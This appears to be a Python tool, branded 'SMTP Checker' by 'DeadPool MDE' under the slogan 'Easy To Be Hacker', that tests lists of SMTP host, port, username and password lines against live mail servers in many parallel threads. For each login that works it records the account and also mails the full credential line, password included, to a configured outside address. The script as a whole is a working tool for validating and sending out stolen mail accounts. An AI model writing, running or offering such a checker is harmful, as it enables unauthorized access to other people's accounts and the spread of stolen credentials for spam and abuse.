import ctypes, yaml, smtplib
import simple_chalk as chalk
import concurrent.futures

banner = """
    ██████╗ ███████╗ █████╗ ██████╗ ██████╗  ██████╗  ██████╗ ██╗     
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██║     
    ██║  ██║█████╗  ███████║██║  ██║██████╔╝██║   ██║██║   ██║██║     
    ██║  ██║██╔══╝  ██╔══██║██║  ██║██╔═══╝ ██║   ██║██║   ██║██║     
    ██████╔╝███████╗██║  ██║██████╔╝██║     ╚██████╔╝╚██████╔╝███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝    
                                                                        
                             ( SMTP Checker )
                    Coded by : github.com/DeadPoolMDE
            Easy To Be Hacker But Hard To Be DeadPool MDE..!!
"""
# Some Styling
e_input = chalk.magenta("[") + chalk.blue("Input") + chalk.magenta("]")

def info(text) : 
    print(chalk.magenta("[") + chalk.blue("Info") + chalk.magenta("] ")+ chalk.green(text))

def e_config(text) : 
    print(chalk.magenta("[") + chalk.blue("Config") + chalk.magenta("] ") + chalk.green(text))

def error(text) : 
    print(chalk.cyan("[") + chalk.red("error") + chalk.cyan("] ")+ chalk.red(text))

def trying(text) : 
    print(chalk.magenta("[") + chalk.green("Trying") + chalk.magenta("] ")+ chalk.magenta(text))

def line() : 
    print(chalk.red("\n#==============================#\n"))

# Some Config

valid = 0
invalid = 0
count = 0 

# Import Config
config               = yaml.safe_load(open("config.yml"))
smtp_file            = config["files"]['smtp_file']
valid_file           = config["files"]['valid_file']
invalid_file         = config["files"]['invalid_file']
threading            = config["config"]['threading']
email_to_send_result = config["config"]['email_to_send_result']

print(chalk.red(banner))
e_config(f"Config Data : ")
e_config(f"SMTP Length : {len(open(smtp_file,'r').read().splitlines())}")
e_config(f"SMTP File : {smtp_file}")
e_config(f"Vaild Output File : {valid_file}")
e_config(f"Invalid Output File : {invalid_file}")
e_config(f"Threading Number : {threading}")
e_config(f"Email To Send SMTP Message To : {email_to_send_result.split('@')[0]}")
line()

input(f"{e_input} {chalk.green('PRESS ENTER TO START.')}")

with open(smtp_file, 'r') as smtp:
    smtps = [line.strip() for line in smtp.readlines()]

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def save(save_file,text):
    with open(save_file, 'a') as f:
                f.write(text + '\n')
def check_smtp(smtp):
    global count, valid, invalid  
    set_console_title(f"[Valid:{valid}|Invalid:{invalid}|Count:{count}]")
    
    count += 1
    domain, port, username, password = smtp.split('|')
    trying(f"Trying : {domain}")
    try:
        with smtplib.SMTP(domain, port, timeout=10) as smtp_server:
            smtp_server.starttls()
            smtp_server.login(username, password)
            message = f"Github: github.com/DeadPoolMDE \nSMTP Checked : {domain}\n{smtp}\n"

            subject = f"SMTP Checked By github.com/DeadPoolMDE : {domain}"
            from_address = username
            sender_name = "DeadPool MDE"
            email_message = f"From: {sender_name} <{from_address}>\nSubject: {subject}\n\n{message}"
            smtp_server.sendmail(from_address, email_to_send_result, email_message)
            success_msg = f"Message sent successfully using {smtp}"

            valid += 1
            info(success_msg)
            save(valid_file,smtp)
    except Exception as e:
        invalid += 1
        save(invalid_file,smtp)
        error(f"Error sending message using {domain}: {str(e)}")

with concurrent.futures.ThreadPoolExecutor(max_workers=threading) as thread:
    thread.map(check_smtp, smtps)
line()
input(chalk.magenta("THE END. [ENTER]"))